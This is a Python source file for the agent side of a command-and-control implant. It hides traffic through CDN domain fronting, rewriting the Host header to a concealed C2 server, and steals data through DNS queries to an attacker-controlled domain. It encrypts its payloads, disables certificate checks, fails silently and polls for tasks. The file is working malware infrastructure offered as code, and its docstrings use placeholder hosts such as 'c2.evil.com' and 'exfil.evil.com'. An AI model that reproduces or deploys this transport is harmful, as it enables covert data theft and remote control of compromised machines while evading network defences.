"""
c2/transport.py - Agent-side C2 transport
Implements CDN fronting (HTTPS POST with Host header rewriting) and DNS exfiltration.
"""

import socket
import struct
import base64
import json
from typing import Optional, Tuple
from urllib.parse import urlencode
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


class C2Transport:
    """C2 transport for agent communication."""
    
    def __init__(
        self,
        channel: str,
        cdn_host: Optional[str] = None,
        real_host: Optional[str] = None,
        dns_domain: Optional[str] = None,
        shared_secret: Optional[str] = None
    ):
        """
        Initialize C2 transport.
        
        Args:
            channel: "cdn_fronting" or "dns_exfil"
            cdn_host: CDN hostname for fronting (e.g., "cdn.example.com")
            real_host: Real C2 hostname for Host header (e.g., "c2.evil.com")
            dns_domain: Authoritative DNS domain for exfil (e.g., "exfil.evil.com")
            shared_secret: Shared secret for encryption (used with HKDF)
        """
        self.channel = channel
        self.cdn_host = cdn_host
        self.real_host = real_host
        self.dns_domain = dns_domain
        self.shared_secret = shared_secret or "default_secret"
        self.session_id = base64.b64encode(os.urandom(16)).decode()
    
    def _derive_key(self, info: str = "") -> bytes:
        """Derive a key from shared_secret using HKDF-SHA256."""
        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b"jocky_c2",
            info=(info or "transport").encode()
        )
        return hkdf.derive(self.shared_secret.encode())
    
    def _encrypt_payload(self, data: bytes) -> bytes:
        """Encrypt payload with AES-256-GCM."""
        key = self._derive_key("payload")
        nonce = os.urandom(12)
        cipher = AESGCM(key)
        ciphertext = cipher.encrypt(nonce, data, None)
        return nonce + ciphertext
    
    def _decrypt_payload(self, encrypted: bytes) -> bytes:
        """Decrypt payload with AES-256-GCM."""
        key = self._derive_key("payload")
        nonce = encrypted[:12]
        ciphertext = encrypted[12:]
        cipher = AESGCM(key)
        return cipher.decrypt(nonce, ciphertext, None)
    
    def send_cdn_fronting(self, payload: bytes) -> bool:
        """
        Send data via HTTPS POST with CDN fronting.
        Connects to cdn_host but sets Host header to real_host.
        """
        import ssl
        
        if not self.cdn_host or not self.real_host:
            return False
        
        try:
            # Encrypt payload
            encrypted = self._encrypt_payload(payload)
            
            # Prepare JSON body
            body_dict = {
                "data": base64.b64encode(encrypted).decode(),
                "session_id": self.session_id
            }
            body = json.dumps(body_dict).encode()
            
            # Create HTTPS connection to CDN host
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE  # Ignore cert validation for C2
            
            conn = socket.create_connection((self.cdn_host, 443), timeout=10)
            ssl_sock = context.wrap_socket(conn, server_hostname=self.cdn_host)
            
            # Build HTTP request with real_host in Host header
            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.real_host}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode() + body
            
            ssl_sock.sendall(request)
            ssl_sock.close()
            
            return True
        except Exception as e:
            # Silent failure in C2 context
            return False
    
    def send_dns_exfil(self, payload: bytes) -> bool:
        """
        Send data via DNS exfiltration.
        Base32-encode chunks and query as DNS TXT records.
        """
        if not self.dns_domain:
            return False
        
        try:
            # Base32-encode the payload
            encoded = base64.b32encode(payload).decode().rstrip('=')
            
            # Split into DNS label chunks (max 63 chars per label)
            chunk_size = 63
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            # Query DNS for each chunk (simplified)
            # In a real implementation, would use dnspython or similar
            for i, chunk in enumerate(chunks):
                subdomain = f"{i}.{chunk}.{self.dns_domain}"
                
                try:
                    # Attempt to resolve (would go to attacker's nameserver)
                    socket.gethostbyname(subdomain)
                except socket.gaierror:
                    # Expected - attacker's NS logs the query
                    pass
            
            return True
        except Exception:
            return False
    
    def send(self, payload: bytes) -> bool:
        """Send payload using configured channel."""
        if self.channel == "cdn_fronting":
            return self.send_cdn_fronting(payload)
        elif self.channel == "dns_exfil":
            return self.send_dns_exfil(payload)
        else:
            return False
    
    def poll_cdn_fronting(self) -> Optional[bytes]:
        """
        Poll for tasks from C2 server via HTTPS GET.
        """
        import ssl
        
        if not self.cdn_host or not self.real_host:
            return None
        
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            conn = socket.create_connection((self.cdn_host, 443), timeout=10)
            ssl_sock = context.wrap_socket(conn, server_hostname=self.cdn_host)
            
            # Build HTTP GET request
            query = urlencode({"session_id": self.session_id})
            request = (
                f"GET /?{query} HTTP/1.1\r\n"
                f"Host: {self.real_host}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            
            ssl_sock.sendall(request)
            
            # Read response
            response = b""
            while True:
                chunk = ssl_sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            
            ssl_sock.close()
            
            # Parse HTTP response
            if b"\r\n\r\n" in response:
                _, body = response.split(b"\r\n\r\n", 1)
                
                # Assume JSON response
                try:
                    data = json.loads(body.decode())
                    if "data" in data:
                        encrypted = base64.b64decode(data["data"])
                        return self._decrypt_payload(encrypted)
                except (json.JSONDecodeError, Exception):
                    pass
            
            return None
        except Exception:
            return None
    
    def poll(self) -> Optional[bytes]:
        """Poll for incoming tasks."""
        if self.channel == "cdn_fronting":
            return self.poll_cdn_fronting()
        elif self.channel == "dns_exfil":
            # DNS doesn't support polling
            return None
        else:
            return None


# Import os after class definition to avoid issues
import os
